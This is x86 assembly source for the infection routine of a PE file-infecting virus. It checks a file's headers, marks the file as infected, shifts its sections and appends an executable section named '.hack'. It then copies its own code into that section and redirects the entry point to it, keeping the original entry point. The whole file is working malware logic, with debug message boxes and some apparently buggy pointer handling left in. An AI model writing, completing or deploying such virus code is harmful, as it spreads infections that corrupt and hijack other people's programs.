ifndef INFECT_FILE_2_ASM_
INFECT_FILE_2_ASM_ MACRO
ENDM

include utils.asm

; Parse and modify the executable mapped in memory to inject our code.
; ebx = delta offset
lastsec_ptrtorawdata     dd 0
lastsec_sizeofrawdata    dd 0
lastsec_virtualaddress   dd 0
lastsec_virtualsize      dd 0

ptr_adressofentrypoint   dd 0
ptr_numberofsections     dd 0
ptr_sizeofcode           dd 0
ptr_sizeofimage          dd 0
ptr_sizeofheaders        dd 0

imagebase                dd 0
filealignment            dd 0
oldentrypoint            dd 0
pointertorawdata         dd 0
ptr_sectionhdrtable      dd 0
sectionalignment         dd 0
tmpbuf                   dd 0

msgText_2                  db "Infection Process", 0
msgCaption_2               db "Alert", 0
msgCaption_db_1          db "Bytes Comparison", 0
msgCaption_db_3          db "Image File Header", 0
msgCaption_db_4          db "Number of Sections", 0
msgError                 db "Common Error!", 0
buffer_db_3              db 256 dup (0)
buffer_db_4              db 256 dup (0)

start_infect:

    pushad
    ;push esi
    cmp  WORD ptr [esi], "ZM"
    jne  infect_err                           ; Check DOS signature
    
    invoke MessageBoxA, NULL, addr msgText_2, addr msgCaption, MB_OK
    invoke MessageBoxA, NULL, esi, addr msgCaption_db_1, MB_OK
    mov  ecx, 042h
    cmp  [esi + 034h], ecx
    je   infect_err                           ; Check if file already infected. Infection marker at IMAGE_DOS_HEADER + 0x34 (e_res2[8])
     invoke MessageBoxA, NULL, addr msgText, addr msgCaption, MB_OK  
    mov  [esi + 034h], ecx 

    add esi,0f0h
    
    invoke MessageBoxA, NULL,esi, addr msgCaption_db_1, MB_OK 
    ; Verificar la firma "PE\0\0"
    cmp  WORD ptr [esi], "EP"    ; Verificar la firma "PE\0\0"
    jne infect_err
    invoke MessageBoxA, NULL, addr msgText, addr msgCaption, MB_OK   
    
    ; Mover ESI al Optional Header
     push esi                                  ; esi -> IMAGE_NT_HEADERS

     add  esi, 04h                             ; esi -> IMAGE_FILE_HEADER
     
     lea  ecx, dword ptr[esi + 02h]                     ;
     
     lea  esi, dword ptr[ptr_numberofsections]    
     mov  esi, ecx            ; Got IMAGE_NT_HEADER.NumberOfSections
     
     pop  esi                                  ; esi -> IMAGE_NT_HEADERS
     push esi
     add  esi, 017h                            ; esi -> IMAGE_OPTIONAL_HEADER
     
    xor  ecx, ecx                             ; DataDirectory[11] = export table bound headers.
    mov  [esi + (60h + 11 * SIZEOF IMAGE_DATA_DIRECTORY)], ecx     ; IMAGE_OPTIONAL_HEADER.DataDirectory[11].VirtualAddress = 0
    mov  [esi + (60h + 11 * SIZEOF IMAGE_DATA_DIRECTORY) + 4], ecx ; IMAGE_OPTIONAL_HEADER.DataDirectory[11].VirtualSize = 0
                                              ; We have to do this b/c in some cases it overlaps with our new header of section.
    
     cmp WORD ptr [esi], 0B01h
    invoke MessageBoxA, NULL, esi, addr msgCaption, MB_OK
    jne infect_err
    invoke MessageBoxA, NULL, addr msgText, addr msgCaption, MB_OK
     
    lea  ecx, dword ptr[esi + 04h]   
    lea eax,dword ptr[ptr_sizeofcode]
    mov  eax, ecx                  ; Got IMAGE_OPTIONAL_HEADER.SizeOfCode
   
    lea  ecx, dword ptr[esi + 010h]              
    lea eax,dword ptr[ptr_adressofentrypoint]      ;
    mov  eax, ecx          ; Got IMAGE_OPTIONAL_HEADER.AddressOfEntryPoint
    mov  ecx, dword ptr[esi + 01ch]                    ;
   lea eax,dword ptr[imagebase]  
    mov  eax, ecx                       ; Got IMAGE_OPTIONAL_HEADER.ImageBase
    mov  ecx, dword ptr[esi + 020h]                    ;
    lea eax,dword ptr[sectionalignment] 
    mov  eax, ecx                ; Got IMAGE_OPTIONAL_HEADER.SectionAlignment
    mov  ecx, dword ptr[esi + 024h]                    ;
    lea eax,dword ptr[filealignment]
    mov  eax, ecx                   ; Got IMAGE_OPTIONAL_HEADER.FileAlignment
    lea  ecx, dword ptr[esi + 038h]                    ;
    lea eax,dword ptr[ptr_sizeofimage]
    mov  eax, ecx                 ; Got IMAGE_OPTIONAL_HEADER.SizeOfImage
    lea  ecx, dword ptr[esi + 03ch]                    ;
    lea eax,dword ptr[ptr_sizeofheaders]
     mov  eax, ecx               ; Got IMAGE_OPTIONAL_HEADER.SizeOfHeaders
     
    pop  esi                                  ; esi -> IMAGE_NT_HEADERS
    
    add  esi, SIZEOF IMAGE_NT_HEADERS         ; esi -> IMAGE_SECTION_HEADER[0]
   lea eax,dword ptr[ptr_sectionhdrtable]  
    mov  eax, esi
   
    mov  ecx, ptr_numberofsections
    xor  eax, eax
    
    add  ax, word ptr[ecx]                   ; eax = number of sections ( = *ptr_numberofsections)
         invoke MessageBoxA, NULL, addr msgText, addr msgCaption, MB_OK
    mov  ecx, SIZEOF IMAGE_SECTION_HEADER
    sub  eax, 1
    mul  ecx
    add  esi, eax                             ; esi -> IMAGE_SECTION_HEADER[last]
    push eax
    mov  ecx, [esi + 08h]
   lea eax,dword ptr[lastsec_virtualsize] 
    mov  eax, ecx             ; Got IMAGE_SECTION_HEADER[last].SizeOfRawData
    mov  ecx, [esi + 0ch]
    lea eax,dword ptr[lastsec_virtualaddress] 
     mov  eax, ecx          ; Got IMAGE_SECTION_HEADER[last].SizeOfRawData
    mov  ecx, [esi + 010h]
    lea eax,dword ptr[lastsec_sizeofrawdata] 
    mov  eax, ecx           ; Got IMAGE_SECTION_HEADER[last].SizeOfRawData
    mov  ecx, [esi + 014h]
    lea eax,dword ptr[lastsec_ptrtorawdata]
    mov  eax, ecx            ; Got IMAGE_SECTION_HEADER[last].PointerToRawData

; --------------------------------------> If the first section starts before 0x400 in the file, we won't have enough space for our extra header.
; --------------------------------------> That's why if it is the case we need to move all the sections in the file by filealignment bytes.

; mov  ecx, ptr_sizeofheaders
; mov  ecx, [ecx]
; cmp  ecx, 0400h
; jae  dont_move_sections                     ; If header is already big enough we don't need to move everything.

    pop eax
    push esi                                  ; esi -> IMAGE_SECTION_HEADER[last]

    mov  esi, ptr_sectionhdrtable             ; esi -> IMAGE_SECTION_HEADER[0]
    mov  esi, [esi + 014h]                    ; esi = IMAGE_SECTION_HEADER[0].PointerToRawData
    lea  esi, dword ptr [esi + filebuffer]                        ; esi is now destination pointer for memmove()
    mov  edi, filealignment
    add  edi, esi                             ; destination is just 1 filealignment further.
    mov  edx, lastsec_ptrtorawdata
    add  edx, lastsec_sizeofrawdata
    mov  ecx, ptr_sectionhdrtable             ;
    sub  edx, [ecx + 014h]                    ; edx -= IMAGE_SECTION_HEADER[0].PointerToRawData. We don't copy the headers and padding to first section.

                                              ; Now, edi -> destination, esi -> source, edx = quantity.
                                              ; Need to malloc a temporary buffer to move the overlapping fields. Stack will explode if we use it.

    push edi
    push esi
    push edx                                  ; Save registers b/c of function call.

    push 04h                                  ; read/write permissions
    push 00001000h                            ; MEM_COMMIT
    push edx                                  ; size to allocate
    push 0                                    ; address. NULL == we want a new address
    call virtualalloc_addr                    ; VirtualAlloc()
    mov  tmpbuf, eax
    cmp  eax, 0
    je   infect_err

    pop  edx
    pop  esi
    pop  edi                                  ; Restore registers after function call.

    push edi
    mov  edi, tmpbuf
    call my_memcpy                            ; copy sections to tmpbuf
    pop  edi                                  ; edi -> destination
    mov  esi, tmpbuf
    call my_memcpy                            ; copy sections back to mapped file.

    push 08000h
    push 0
    push tmpbuf
    call virtualfree_addr

; --------------------------------------> Update all section headers for new sections offsets in file, ie add filealignment to their offset.

    xor  edx, edx
    mov  edi, ptr_numberofsections
    xor  eax, eax
    mov  ax, WORD ptr [edi]                   ; eax = number of sections ( = *ptr_numberofsections)
    mov  edi, eax                             ; edi = numberofsections
    mov  esi, ptr_sectionhdrtable             ; esi -> IMAGE_SECTION_HEADER[0]
update_sec_hdrs:
    mov  ecx, [esi + 014h]                    ; esi -> IMAGE_SECTION_HEADER[edx].PointerToRawData
    add  ecx, filealignment                   ;
    mov  [esi + 014h], ecx                    ; IMAGE_SECTION_HEADER[edx].PointerToRawData += filealignment
    inc  edx
    add  esi, SIZEOF IMAGE_SECTION_HEADER
    cmp  edx, edi                             ; while edx < numberofsections
    jne  update_sec_hdrs

dont_move_sections:
; --------------------------------------> Now we can move on to write our new section header.

    pop  esi                                  ; esi -> IMAGE_SECTION_HEADER[last]

    add  esi, SIZEOF IMAGE_SECTION_HEADER     ; esi -> IMAGE_SECTION_HEADER[last + 1]

    push esi                                  ;
    mov  edi, esi                             ;
    mov  esi, 0                               ;
    mov  edx, SIZEOF IMAGE_SECTION_HEADER     ;
    call my_memset                            ;
    pop  esi                                  ; Initialize new section header.

    push esi                                  ; esi save -> IMAGE_SECTION_HEADER[last + 1]

    mov  ecx, "cah."                          ;
    mov  [esi], ecx                           ;
    add  esi, 04h                             ;
    mov  ecx, "k"                             ;
    mov  [esi], ecx                           ; Wrote the name of our new section. Niark niark niark...

    add  esi, 04h                             ; esi -> IMAGE_SECTION_HEADER[last + 1].VirtualSize
    mov  ecx, end_copy - begin_copy
    mov  [esi], ecx                           ; Wrote VirtualSize

    add  esi, 04h                             ; esi -> IMAGE_SECTION_HEADER[last + 1].VirtualAddress
    mov  ecx, lastsec_virtualaddress
    add  ecx, lastsec_virtualsize
    invoke ceil_align, ecx, sectionalignment
    mov  [esi], eax                           ; Wrote VirtualAddress

    add  esi, 04h                             ; esi -> IMAGE_SECTION_HEADER[last + 1].SizeOfRawData
    mov  ecx, end_copy - begin_copy
    invoke ceil_align, ecx, filealignment     ; Align size of our code with fileAlignment
    mov  [esi], eax                           ; Wrote SizeOfRawData
    mov  filesize_sf, eax                        ; new filesize_sf, still need to add pointertorawdata (step 1/2)

    add  esi, 04h                             ; esi -> IMAGE_SECTION_HEADER[last + 1].PointerToRawData
    mov  ecx, lastsec_ptrtorawdata
    add  ecx, lastsec_sizeofrawdata
    add  ecx, 0200h                           ; For when we move the sections (see around update_sec_hdrs: label)
    mov  [esi], ecx                           ; Wrote PointerToRawData
    mov  pointertorawdata, ecx
    add  ecx, filesize_sf                        ;
    mov  filesize_sf, ecx                        ; Got our new file size (step 2/2)

    pop  esi                                  ; esi -> IMAGE_SECTION_HEADER[last + 1]
    add  esi, 024h                            ; esi -> IMAGE_SECTION_HEADER[last + 1].Characteristics

    mov  ecx, 060000020h                      ; Contains code | readable | executable
    mov  [esi], ecx

; --------------------------------------> New section header finally written. Phew !
; --------------------------------------> Now, let's update the right fields.

    mov  ecx, ptr_adressofentrypoint
    mov  edx, [ecx]
    mov  oldentrypoint, edx
    mov  edx, lastsec_virtualaddress          ;
    add  edx, lastsec_virtualsize             ;
    invoke ceil_align, edx, sectionalignment  ;
    add  eax, start - begin_copy              ; newentrypoint = lastsec_virtualaddress + ceil_align(lastsec_virtualsize, sectionalignment) + (start - begin_copy)
    mov  [ecx], eax                           ; Updated AddressOfEntryPoint

    mov  ecx, ptr_numberofsections
    mov  edx, [ecx]
    inc  edx
    mov  [ecx], edx                           ; Updated NumberOfSections

    mov  ecx, ptr_sizeofcode
    mov  edx, [ecx]
    add  edx, end_copy - begin_copy
    invoke ceil_align, edx, sectionalignment
    mov  [ecx], eax                           ; Updated SizeOfCode

    mov  ecx, ptr_sizeofimage
    mov  edx, [ecx]
    add  edx, end_copy - begin_copy
    invoke ceil_align, edx, sectionalignment
    mov  [ecx], eax                           ; Updated SizeOfImage

; --------------------------------------> PE fields updated.
; --------------------------------------> Let's write our code where it belongs.

    lea edi, dword ptr[filebuffer]
    lea  edi,dword ptr[edi+ pointertorawdata]
    push esi
    mov  esi, begin_copy
    add  esi, ebx                             ; ebx = delta offset. This is to be position independent.
    mov  edx, end_copy - begin_copy
    call my_memcpy
    pop  esi                                  ; Wrote new section to infected file.

; --------------------------------------> Write oldentrypoint to the 4 first bytes of infected file

    lea  ecx, dword ptr [filebuffer]
    add  ecx, pointertorawdata
    mov  edx, oldentrypoint
    mov  [ecx], edx                           ; Wrote oldentrypoint to new section.

    popad

; mov  eax, 1
; jmp  end_infect                             ; return 0 or 1 depending on error.
infect_err:
end_infect:
    mov  eax, filesize_sf

    ret
infect_file_2_ENDP:

endif   